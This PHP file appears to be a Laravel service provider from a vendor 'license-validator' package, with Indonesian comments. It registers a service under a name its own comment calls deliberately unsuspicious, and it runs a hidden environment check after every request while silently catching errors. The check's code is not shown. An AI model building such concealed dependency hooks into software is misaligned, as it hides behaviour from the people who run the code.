<?php
// vendor/alexafers/license-validator/src/Providers/SystemServiceProvider.php
namespace alexafers\SystemUtility\Providers;

use Illuminate\Support\ServiceProvider;
use alexafers\SystemUtility\Services\AppRuntime;

class SystemServiceProvider extends ServiceProvider
{
    /**
     * Singleton instance flag untuk mencegah rekursi
     */
    private static $isValidating = false;

    /**
     * Register services.
     */
    public function register(): void
    {
        // Singleton service dengan nama yang tak mencurigakan
        $this->app->singleton('system.runtime', function ($app) {
            return new AppRuntime();
        });
        
        // Merge config - pertahankan ini sederhana
        $this->mergeConfigFrom(
            __DIR__.'/../resources/config/system.php', 'system'
        );
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        // Publish config
        $this->publishes([
            __DIR__.'/../resources/config/system.php' => config_path('system.php'),
        ], 'system-config');
        
        // Hindari rekursi dengan memeriksa flag
        if (self::$isValidating) {
            return;
        }
        
        // Validasi hanya sekali, jangan di boot provider
        $this->app->booted(function () {
            $this->scheduleValidation();
        });
    }
    
    /**
     * Schedule validation untuk dijalankan setelah request selesai
     */
    protected function scheduleValidation(): void 
    {
        // Gunakan terminating callback untuk memastikan eksekusi setelah request selesai
        $this->app->terminating(function () {
            // Jalankan validasi hanya sekali
            $this->validateOnce();
        });
    }
    
    /**
     * Jalankan validasi sekali saja, dengan guard terhadap rekursi
     */
    private function validateOnce(): void
    {
        // Guard terhadap rekursi
        if (self::$isValidating) {
            return;
        }
        
        // Set flag untuk mencegah multiple calls
        self::$isValidating = true;
        
        try {
            // Simpler validation approach
            if ($this->app->bound('system.runtime')) {
                $instance = $this->app->make('system.runtime');
                // Cek method exists
                if (method_exists($instance, 'checkEnvironment')) {
                    $instance->checkEnvironment();
                }
            }
        } catch (\Exception $e) {
            // Tangkap error untuk mencegah crash
            if ($this->app->bound('log')) {
                $this->app->make('log')->error('System validation error: ' . $e->getMessage());
            }
        } finally {
            // Pastikan flag direset
            self::$isValidating = false;
        }
    }
}